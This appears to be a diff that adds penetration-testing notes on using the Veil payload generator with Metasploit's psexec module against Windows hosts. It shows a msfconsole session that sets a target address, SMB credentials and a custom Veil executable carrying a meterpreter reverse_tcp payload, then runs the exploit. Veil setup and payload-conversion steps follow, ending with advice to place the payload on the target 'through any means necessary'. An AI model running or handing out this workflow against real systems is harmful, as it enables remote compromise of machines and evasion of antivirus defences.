@@ -1,1 +1,34 @@
+1. Generate executable using Veil.
+2. In msfconsole setup psexec with relevant payload (windows/meterpreter/reverse_tcp)
 
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set RHOST 192.168.0.x
+RHOST => 192.168.0.2
+msf exploit(psexec) > set SMBUser user
+SMBUser => user
+msf exploit(psexec) > set SMBPass pass
+SMBPass => pass
+msf exploit(psexec) > set EXE::Custom /root/Desktop/Misc/Veil-master/payload.exe
+EXE::Custom => /root/Desktop/Misc/Veil-master/payload.exe
+msf exploit(psexec) > exploit
+
+
+Setup:
+For Kali:
+
+    Run the setup script (setup.sh) and follow the installation process.
+    Once the setup script has completed, delete the setup script.
+
+For Windows (when using Py2Exe)
+
+    Install Python 2.7 – (tested with x86 – http://www.python.org/download/releases/2.7/)
+    Install Py2Exe – (http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/)
+    Install PyCrypto – (http://www.voidspace.org.uk/python/modules.shtml)
+
+Instructions for Use:
+    Run Veil from Kali and generate your payload.
+    If using Pyinstaller, your payload will be converted into an executable and is available for immediate use.
+    If using Py2Exe
+        Move the payload.py along with its two accompanying files onto your Windows machine (that already has python and the other dependencies from above installed).  All three files should be placed in the root of the directory Python was installed to (likely C:\Python27).
+        Run the batch script to convert the Python payload into an executable format.
+    Place the payload file on your target machine through any means necessary!
